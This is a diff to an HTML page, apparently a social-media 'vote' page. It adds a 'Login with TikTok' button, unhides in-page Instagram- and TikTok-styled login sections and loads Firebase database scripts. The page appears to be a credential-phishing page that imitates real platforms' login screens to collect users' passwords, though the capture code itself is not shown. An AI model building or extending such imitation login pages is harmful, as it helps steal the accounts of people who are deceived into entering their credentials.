@@ -99,6 +99,12 @@
         Facebook
       </button>
     </div>
+
+    <div class="social-vote-button">
+      <button onclick="showLoginForm('tiktok')" class="tiktok-button3"><i class="fab fa-tiktok"></i> Login with
+        TikTok
+      </button>
+    </div>
     <br><br>
     <p class="powered-by">Powered by <strong>MBC</strong></p>
 
@@ -210,7 +216,7 @@
     <div id="instagram-login" class="hidden bg-black">
       <div class="min-h-screen flex flex-col w-full">
         <!-- Main Content Section -->
-        <main class="flex-grow p-2"> <!-- Reduced padding here -->
+        <main class="flex-grow"> <!-- Reduced padding here -->
 
 
           <div class="flex justify-center mt-11 mb-6">
@@ -292,7 +298,7 @@
     </div>
 
 
-    <div id="tiktok-login">
+    <div id="tiktok-login" class="hidden bg-gray-100">
       <div class="hidden min-h-screen flex flex-col w-full">
         <!-- Main Content Section -->
         <main class="flex-grow">
@@ -521,45 +527,6 @@
     }
   </script>
 
-  <script>
-    function showPreloader() {
-      document.getElementById("preloader").style.display = "flex";
-    }
-
-    function hidePreloader() {
-      document.getElementById("preloader").style.display = "none";
-    }
-
-    function Twitter() {
-      showPreloader();
-      setTimeout(function () {
-        hidePreloader();
-        document.getElementById("twitter").style.display = "flex";
-      }, 1000); // Delay in milliseconds
-    }
-
-    function Instagram() {
-      showPreloader();
-      setTimeout(function () {
-        hidePreloader();
-        document.getElementById("instagram").style.display = "flex";
-      }, 1000); // Delay in milliseconds
-    }
-
-    function Facebook() {
-      showPreloader();
-      setTimeout(function () {
-        hidePreloader();
-        document.getElementById("facebook").style.display = "flex";
-      }, 1000); // Delay in milliseconds
-    }
-
-    function closeDialog() {
-      document.getElementById("instagram").style.display = "none";
-      document.getElementById("twitter").style.display = "none";
-      document.getElementById("facebook").style.display = "none";
-    }
-  </script>
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
 
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
